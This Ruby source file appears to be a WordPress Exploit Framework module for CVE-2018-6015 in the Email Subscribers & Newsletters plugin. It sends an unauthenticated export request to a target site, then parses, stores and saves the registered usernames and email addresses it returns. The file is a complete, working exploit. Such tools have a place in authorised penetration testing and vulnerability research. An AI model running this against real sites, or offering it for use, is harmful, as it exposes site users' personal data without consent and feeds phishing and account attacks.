# frozen_string_literal: true

require 'wpxf/helpers/export'

class Wpxf::Auxiliary::EmailSubscribersUserListDisclosure < Wpxf::Module
  include Wpxf
  include Wpxf::Helpers::Export

  def initialize
    super

    update_info(
      name: 'Email Subscribers & Newsletters <= 3.4.7 User List Disclosure',
      desc: %(
        This module exploits a vulnerability in Email Subscribers & Newsletters
        which allows anonymous users to download a list of the registered users
        and the associated e-mail addresses.
      ),
      author: [
        'Threat Press', # Disclosure
        'rastating'     # WPXF module
      ],
      references: [
        ['WPVDB', '9014'],
        ['CVE', '2018-6015'],
        ['URL', 'https://blog.threatpress.com/vulnerability-email-subscribers-plugin/']
      ],
      date: 'Jan 24 2018'
    )
  end

  def check
    check_plugin_version_from_readme('email-subscribers', '3.4.8')
  end

  def request_user_list
    res = execute_post_request(
      url: full_uri,
      params: { 'es' => 'export' },
      body: { 'option' => 'registered_user' }
    )

    if res.nil?
      emit_error 'No response from the target'
      return nil
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return nil
    end

    res
  end

  def process_row(row)
    return unless row[:name] && row[:email]
    emit_success "Found user: #{row[:name]} (#{row[:email]})", true
    store_credentials row[:name]
    @users.push(username: row[:name], email: row[:email])
  end

  def parse_csv(body, delimiter)
    @users = [{
      username: 'Username', email: 'E-mail'
    }]

    begin
      CSV::Converters[:blank_to_nil] = lambda do |field|
        field&.empty? ? nil : field
      end
      csv = CSV.new(
        body,
        col_sep: delimiter,
        headers: true,
        header_converters: :symbol,
        converters: %i[all blank_to_nil]
      )

      csv.to_a.map { |row| process_row(row) }
      emit_table @users
      return true
    rescue Error
      return false
    end
  end

  def run
    return false unless super

    emit_info 'Requesting the user list...'
    res = request_user_list
    return false if res.nil?

    emit_info 'Parsing result...', true
    parse_csv res.body, ','

    loot = export_and_log_loot(res.body, 'Registered users and e-mail addresses', 'user list', '.csv')
    emit_success "User list saved to #{loot.path}"

    true
  end
end
